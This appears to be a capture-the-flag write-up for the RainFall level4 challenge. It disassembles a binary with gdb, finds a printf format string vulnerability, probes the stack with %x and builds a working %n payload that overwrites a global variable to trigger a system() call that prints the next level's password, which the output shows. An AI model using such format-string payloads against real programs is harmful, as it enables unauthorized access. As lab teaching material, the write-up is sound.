Same behaviour as last exercise, we get prompted for a input than it is printed
First thing we see is a function n in the main that also calls another function inside of it, p.
First function n will alocate 520 bytes `0x08048471 <+26>:	lea    -0x208(%ebp),%eax` to our local variable wich will be used to store the input of fgets(), but fgets() will accept only 512 bytes of input `0x08048471 <+26>:	lea    -0x208(%ebp),%eax`
```
   0x08048457 <+0>:	push   %ebp
   0x08048458 <+1>:	mov    %esp,%ebp
   0x0804845a <+3>:	sub    $0x218,%esp
   0x08048460 <+9>:	mov    0x8049804,%eax
   0x08048465 <+14>:	mov    %eax,0x8(%esp)
   0x08048469 <+18>:	movl   $0x200,0x4(%esp)
   0x08048471 <+26>:	lea    -0x208(%ebp),%eax --- size for buffer
   0x08048477 <+32>:	mov    %eax,(%esp)
   0x0804847a <+35>:	call   0x8048350 <fgets@plt>
   0x0804847f <+40>:	lea    -0x208(%ebp),%eax --size for printf
   0x08048485 <+46>:	mov    %eax,(%esp)
   0x08048488 <+49>:	call   0x8048444 <p> ---function where it just calls printf
   0x0804848d <+54>:	mov    0x8049810,%eax --- move variable m wich is undeclared in eax to be compared
   0x08048492 <+59>:	cmp    $0x1025544,%eax --- compare m to 16930116  
   0x08048497 <+64>:	jne    0x80484a5 <n+78> --- if not equal jump to the end of the function
   0x08048499 <+66>:	movl   $0x8048590,(%esp)
   0x080484a0 <+73>:	call   0x8048360 <system@plt>
   0x080484a5 <+78>:	leave  
   0x080484a6 <+79>:	ret    
   
(gdb) print 0x1025544
$1 = 16930116
(gdb) x/s 0x8048590
0x8048590:	 "/bin/cat /home/user/level5/.pass"
(gdb) x/s 0x8049810
0x8049810 <m>:	 ""
```
So we have found our goal and the fact the the format string can be exploited again
```
level4@RainFall:~$ python -c 'print "AAAAA " + "%x " * 20' > /tmp/exploit
level4@RainFall:~$ cat /tmp/exploit | ./level4 
AAAAA b7ff26b0 bffff6a4 b7fd0ff4 0 0 bffff668 804848d bffff460 200 b7fd1ac0 b7ff37d0 ***41414141*** 78252041 20782520 25207825 78252078 20782520 25207825 78252078 20782520 
```
so the inded string will be on the 12th position. But know the problem is that our fgets buffer will not hold the 16930116 bytes so we need another way to directly write that to m.
```
(gdb) run < <(python -c 'print "\x10\x98\x04\x08" + "%16930116%12$n"')
Starting program: /home/user/level4/level4 < <(python -c 'print "\x10\x98\x04\x08" + "%16930116%12$n"')

Breakpoint 1, 0x08048450 in p ()
(gdb) print m
$1 = 0
(gdb) ni
%12$n
0x08048455 in p ()
(gdb) print m
$2 = 0
```
Like this it would not work as we should directly as the decimal value to it so we will use the format character %d
```
(gdb) run < <(python -c 'print "\x10\x98\x04\x08" + "%16930116d%12$n"')
(gdb) print m
$4 = 16930120
```
Now it's better and all we have to do is subtract 4 bytes (sizeof m)
```
level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' > /tmp/exploit
level4@RainFall:~$ cat /tmp/exploit - | ./level4


 -1208015184
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```